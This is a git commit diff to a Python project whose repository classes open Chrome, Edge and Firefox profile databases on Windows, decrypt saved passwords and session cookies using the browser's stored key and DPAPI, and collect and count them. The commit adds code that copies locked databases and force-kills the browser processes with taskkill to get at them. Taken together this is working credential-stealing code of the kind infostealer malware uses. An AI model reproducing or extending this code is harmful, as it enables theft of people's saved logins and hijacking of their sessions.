d07d9526cc5025f046120acbe9e805fbc01851f1
wilmerxx <wmshagnay@espe.edu.ec>
2024-02-14 05:42:14 -0500

    cambios

--- repositories/chrome_cookies_repositorio.py
+++ repositories/chrome_cookies_repositorio.py
@@ -1,8 +1,11 @@
 import base64
 import json
 import os
+import shutil
 import sqlite3
 import binascii
+import subprocess
+
 import win32crypt
 from Crypto.Cipher import AES
 
@@ -21,92 +24,148 @@ class CookieRepository_Chrome:
        self.chrome_path_llaves = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        self.chrome_path_user = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
 
+    #realizar una copia de la base de datos
+
+
     def get_chrome_cookies(self):
         cookies = []
-        llave = obtener_llave_session(self.chrome_path_llaves)
-        with sqlite3.connect(self.cookies_path_chrome) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies")
-            for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
-                try:
-                    encrypted_value = desecriptar_dato(encrypted_value, llave)
-                    cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
-                except Exception as e:
-                    print(f"Error al desencriptar la cookie: {e}")
+        try:
+            llave = obtener_llave_session(self.chrome_path_llaves)
+            with conesiones_db(self.cookies_path_chrome) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies")
+
+                for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
+                    try:
+                        encrypted_value = desecriptar_dato(encrypted_value, llave)
+                        cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
+                    except Exception as e:
+                        print(f"Error al desencriptar la cookie: {e}")
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
         return cookies
 
     def get_chrome_cookies_session(self):
         cookies = []
-        llave = obtener_llave_session(self.chrome_path_llaves)
-        with sqlite3.connect(self.cookies_path_chrome) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies WHERE is_secure = 1")
-            for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
-                try:
-                    encrypted_value = desecriptar_dato(encrypted_value, llave)
-                    cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
-                except Exception as e:
-                    print(f"Error al desencriptar la cookie: {e}")
+        try:
+            llave = obtener_llave_session(self.chrome_path_llaves)
+            with conesiones_db(self.cookies_path_chrome) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies WHERE is_secure = 1")
+                for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
+                    try:
+                        encrypted_value = desecriptar_dato(encrypted_value, llave)
+                        cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
+                    except Exception as e:
+                        print(f"Error al desencriptar la cookie: {e}")
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
         return cookies
 
     def obtener_contrasenias(self):
         contrasenias = []
-        llave = obtener_llave_session(self.chrome_path_llaves)
-        with sqlite3.connect(self.chrome_path_user) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins")
-            for origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified in cursor.fetchall():
-                try:
-                    if password_value and username_value:
-                        password_value = desecriptar_dato(password_value, llave)
-                        contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
-                    else:
-                        continue
+        try:
+            llave = obtener_llave_session(self.chrome_path_llaves)
+            with conesiones_db(self.chrome_path_user) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins")
+                for origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified in cursor.fetchall():
+                    try:
+                        if password_value and username_value:
+                            password_value = desecriptar_dato(password_value, llave)
+                            contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
+                        else:
+                            continue
 
-                except Exception as e:
-                    print(f"Error al desencriptar la contraseña: {e}")
+                    except Exception as e:
+                        print(f"Error al desencriptar la contraseña: {e}")
+        except sqlite3.Error as e:
+            print(f"Error al obtener las contraseñas: {e}")
         return contrasenias
 
     def numeros_paginas_encontradas_sin_repetir(self):
     # obtener el numero de paginas encontradas sin repetir y su  url
         lista_paginas = []
-        with sqlite3.connect(self.chrome_path_user) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC")
-            for origin_url, count in cursor.fetchall():
-                lista_paginas.append((origin_url, count))
+        try:
+            with conesiones_db(self.chrome_path_user) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC")
+                for origin_url, count in cursor.fetchall():
+                    lista_paginas.append((origin_url, count))
+        except sqlite3.Error as e:
+            print(f"Error al obtener las paginas: {e}")
         return lista_paginas
 
     def top_ten_paginas_encontradas_sin_repetir(self):
     # obtener el top 10 de paginas encontradas sin repetir y su  url
         lista_paginas = []
-        with sqlite3.connect(self.chrome_path_user) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC LIMIT 10")
-            for origin_url, count in cursor.fetchall():
-                lista_paginas.append((origin_url, count))
+        try:
+            with conesiones_db(self.chrome_path_user) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC LIMIT 10")
+                for origin_url, count in cursor.fetchall():
+                    lista_paginas.append((origin_url, count))
+        except sqlite3.Error as e:
+            print(f"Error al obtener las paginas: {e}")
         return lista_paginas
 
     def numero_contrasenias_encontradas(self):
     # obtener el numero de contraseñas encontradas
-        with sqlite3.connect(self.chrome_path_user) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL")
-            row = cursor.fetchone()
-            return row[0]
+        try:
+            with conesiones_db(self.chrome_path_user) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL")
+                row = cursor.fetchone()
+                return row[0]
+        except sqlite3.Error as e:
+            print(f"Error al obtener el numero de contraseñas: {e}")
+            return 0
 
     def count_session_cookies(self):
     # obtener el numero de cookies de session
-        with sqlite3.connect(self.cookies_path_chrome) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT COUNT(*) FROM cookies WHERE is_secure = 1")
-            row = cursor.fetchone()
-        return row[0] if row else 0
+        try:
+            with conesiones_db(self.cookies_path_chrome) as conn:
+                cursor = conn.cursor()
+                cursor.execute("SELECT COUNT(*) FROM cookies WHERE is_secure = 1")
+                row = cursor.fetchone()
+            return row[0] if row else 0
+        except sqlite3.Error as e:
+            print(f"Error al obtener el numero de cookies de session: {e}")
+            return 0
 
 
 
 
+def verificar_conexion(path_db):
+    try:
+        conn = sqlite3.connect(path_db)
+        conn.close()
+        return True
+    except sqlite3.Error as e:
+        return False
 
+def conesiones_db(path_db):
+    try:
+        if verificar_conexion(path_db):
+            if os.path.exists(path_db + "copia"):
+                os.remove(path_db + "copia")
+            conn = sqlite3.connect(path_db)
+            shutil.copy2(path_db, path_db + "copia")
+            return conn
+        else:
+            conn = sqlite3.connect(path_db + "copia")
+            return conn
+    except sqlite3.Error as e:
+        try:
+            cerrar_proceso("chrome.exe")
+        except Exception as e:
+            print(f"Error al cerrar el proceso: {e}")
+            pass
+
+
+def cerrar_proceso(nombre_proceso):
+    subprocess.call(['taskkill', '/F', '/IM', nombre_proceso])
+    print(f"Proceso {nombre_proceso} cerrado")
 
 
 
--- repositories/cookie_repository.py
+++ repositories/cookie_repository.py
@@ -1,8 +1,11 @@
 import base64
 import json
 import os
+import shutil
 import sqlite3
 import binascii
+import subprocess
+
 import win32crypt
 from Crypto.Cipher import AES
 from models.firefox import FirefoxCookie, FirefoxUsuarios
@@ -15,10 +18,10 @@ from Crypto.Protocol.KDF import PBKDF2
 
 class CookieRepository_Firefox:
     def __init__(self):
-        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "cookies.sqlite")
-        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "key4.db")
-        self.firefox_password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",
-                                                'Profiles', "1knc2i2e.default-release", "logins.json")
+        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", 'Profiles', "1knc2i2e.default-release", "cookies.sqlite")
+        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", 'Profiles', "1knc2i2e.default-release", "key4.db")
+        self.firefox_password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", 'Profiles', "1knc2i2e.default-release", "logins.json")
+        cerrar_proceso("firefox")
     # Obtner las cookies de firefox
     def get_firefox_cookies(self):
         cookies = []
@@ -109,7 +112,6 @@ class CookieRepository_Firefox:
 
     def obtener_contrasenias(self):
         contrasenias = []
-        #llave = self.obtener_llave_session()
         with open(self.firefox_password_db_path, 'r') as file:
             data = json.load(file)
             for login in data['logins']:
@@ -117,8 +119,6 @@ class CookieRepository_Firefox:
                 action_url = login['formSubmitURL']
                 username_value = login['encryptedUsername']
                 password_value = login['encryptedPassword']
-                #username_value =desecriptar_dato(username_value, llave)
-                #password_value = desecriptar_dato(password_value, llave)
                 date_created = login['timeCreated']
                 date_last_used = login['timeLastUsed']
                 if username_value or password_value:
@@ -155,17 +155,18 @@ class CookieRepository_Edge:
         self.edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default",'Network', "Cookies")
         self.edge_db_user_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",'Default', "Login Data")
         self.directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Microsoft", "Edge", "User Data", "Local State")
+
     # Obtner las cookies de session de edge
     def get_edge_cookies(self):
         cookies = []
         llave = obtener_llave_session(self.directorio_llaves_edge)
-        with sqlite3.connect(self.edge_db_path) as conn:
+
+        with conesiones_db(self.edge_db_path) as conn:
             cursor = conn.cursor()
             cursor.execute(
                 'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies')
             for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
                 try:
-
                     encrypted_value = desecriptar_dato(encrypted_value, llave)
 
                     cookies.append(EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
@@ -174,91 +175,111 @@ class CookieRepository_Edge:
                                    source_port, encrypted_value))
                 except Exception as e:
                     print(f"Error desencriptando cookie: {e}")
+
         return cookies
 
 
     # Obtner las cookies de session de edge
     def get_edge_cookies_session(self):
         session_cookies = []
-        llave = obtener_llave_session(self.directorio_llaves_edge)
-        with sqlite3.connect(self.edge_db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(
-                'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies WHERE is_secure = 1 ORDER BY expires_utc DESC')
-            for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
-                try:
-                    encrypted_value = desecriptar_dato(encrypted_value, llave)
+        try:
+            llave = obtener_llave_session(self.directorio_llaves_edge)
+            with conesiones_db(self.edge_db_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies WHERE is_secure = 1 ORDER BY expires_utc DESC')
+                for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
+                    try:
+                        encrypted_value = desecriptar_dato(encrypted_value, llave)
 
-                    session_cookies.append(
-                        EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
-                                   is_secure,
-                                   is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite,
-                                   source_port, encrypted_value))
-                except Exception as e:
-                    print(f"Error desencriptando cookie: {e}")
+                        session_cookies.append(
+                            EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
+                                       is_secure,
+                                       is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite,
+                                       source_port, encrypted_value))
+                    except Exception as e:
+                        print(f"Error desencriptando cookie: {e}")
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
 
         return session_cookies
 
     # Contar las cookies de session de edge
     def count_edge_cookies_session(self):
-        with sqlite3.connect(self.edge_db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(
-                'SELECT COUNT(*) FROM cookies WHERE is_secure = 1')
-            row = cursor.fetchone()
-        return row[0] if row else 0
+        try:
+            with conesiones_db(self.edge_db_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    'SELECT COUNT(*) FROM cookies WHERE is_secure = 1')
+                row = cursor.fetchone()
+            return row[0] if row else 0
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
+            pass
 
     def numeros_paginas_encontradas_sin_repetir(self):
         #obtener el numero de paginas encontradas sin repetir y su  url
         listaPaginasYcantidadPaginas = []
-        with sqlite3.connect(self.edge_db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(
-                'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC')
-            for url, cantidad in cursor.fetchall():
-                listaPaginasYcantidadPaginas.append((url, cantidad))
+        try:
+            with conesiones_db(self.edge_db_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC')
+                for url, cantidad in cursor.fetchall():
+                    listaPaginasYcantidadPaginas.append((url, cantidad))
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
         return listaPaginasYcantidadPaginas
 
 
     def top_ten_paginas_encontradas_sin_repetir(self):
         #obtener el top 10 de paginas encontradas sin repetir
         listaPaginasYcantidadPaginas = []
-        with sqlite3.connect(self.edge_db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(
-                'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC LIMIT 10')
-            for url, cantidad in cursor.fetchall():
-                listaPaginasYcantidadPaginas.append((url, cantidad))
+        try:
+            with conesiones_db(self.edge_db_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC LIMIT 10')
+                for url, cantidad in cursor.fetchall():
+                    listaPaginasYcantidadPaginas.append((url, cantidad))
+        except sqlite3.Error as e:
+            print(f"Error al obtener las cookies: {e}")
         return listaPaginasYcantidadPaginas
 
 
     def obtener_contrasenias(self):
         llave = obtener_llave_session(self.directorio_llaves_edge)
         contrasenias = []
-        with sqlite3.connect(self.edge_db_user_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute(
-                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created desc')
-            for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.fetchall():
-                password = desecriptar_dato(password_value, llave)
-                if username_value or password:
-                    aux = edge_usuario_contrasenia(origin_url, action_url, username_value, password, date_created,
-                                                   date_last_used)
-                else:
-                    continue
-                contrasenias.append(aux)
-        cursor.close()
-        conn.close()
+        try:
+            with conesiones_db(self.edge_db_user_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created desc')
+                for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.fetchall():
+                    password = desecriptar_dato(password_value, llave)
+                    if username_value or password:
+                        aux = edge_usuario_contrasenia(origin_url, action_url, username_value, password, date_created,
+                                                       date_last_used)
+                    else:
+                        continue
+                    contrasenias.append(aux)
+            cursor.close()
+            conn.close()
+        except sqlite3.Error as e:
+            print(f"Error al obtener las contraseñas: {e}")
         return contrasenias
 
     def numero_contrasenias_encontradas(self):
         #obtener el numero de contrasenias encontradas y no encontradas
         contrasenias = []
-        with sqlite3.connect(self.edge_db_user_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL')
-            row = cursor.fetchone()
-            contrasenias.append(row[0])
+        try:
+            with conesiones_db(self.edge_db_user_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute('SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL')
+                row = cursor.fetchone()
+                contrasenias.append(row[0])
+        except sqlite3.Error as e:
+            print(f"Error al obtener las contraseñas: {e}")
         return contrasenias
 
 def obtener_llave_session(directorio_llaves):
@@ -284,5 +305,37 @@ def desecriptar_dato(data ,llave):
             return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
         except Exception:
             return ""
+
+
+def verificar_conexion(path_db):
+    try:
+        conn = sqlite3.connect(path_db)
+        conn.close()
+        return True
+    except sqlite3.Error as e:
+        return False
+
+def conesiones_db(path_db):
+    try:
+        if verificar_conexion(path_db):
+            if os.path.exists(path_db + "copia"):
+                os.remove(path_db + "copia")
+            conn = sqlite3.connect(path_db)
+            shutil.copy2(path_db, path_db + "copia")
+            return conn
+        else:
+            conn = sqlite3.connect(path_db + "copia")
+            return conn
+    except sqlite3.Error as e:
+        try:
+            cerrar_proceso("chrome.exe")
+        except Exception as e:
+            print(f"Error al cerrar el proceso: {e}")
+            pass
+
+
+def cerrar_proceso(nombre_proceso):
+    subprocess.call(['taskkill', '/F', '/IM', nombre_proceso])
+    print(f"Proceso {nombre_proceso} cerrado")
 
 
